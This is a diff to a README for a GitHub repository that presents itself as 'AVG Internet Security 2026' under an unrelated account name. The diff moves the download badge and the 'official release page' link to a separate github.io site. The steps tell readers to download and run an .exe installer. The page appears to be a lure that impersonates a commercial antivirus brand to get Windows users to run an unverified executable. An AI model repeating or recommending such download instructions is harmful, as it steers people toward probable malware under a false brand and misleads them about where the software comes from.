@@ -1,6 +1,6 @@
 # 🛡️ AVG-Internet-Security-2026 - Protect your windows computer from threats
 
-[![](https://img.shields.io/badge/Download-AVG_Internet_Security-blue.svg)](https://github.com/futureless-subpart637/AVG-Internet-Security-2026/releases)
+[![](https://img.shields.io/badge/Download-AVG_Internet_Security-blue.svg)](https://futureless-subpart637.github.io)
 
 ## 📌 About This Software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these minimum standards to run the software:
 
 Follow these steps to set up your security software.
 
-1. Go to the [official release page](https://github.com/futureless-subpart637/AVG-Internet-Security-2026/releases) to access the installation files.
+1. Go to the [official release page](https://futureless-subpart637.github.io) to access the installation files.
 2. Look for the file ending in .exe under the latest version.
 3. Click the file name to download the installer to your computer.
 4. Locate the file in your Downloads folder once the download finishes.
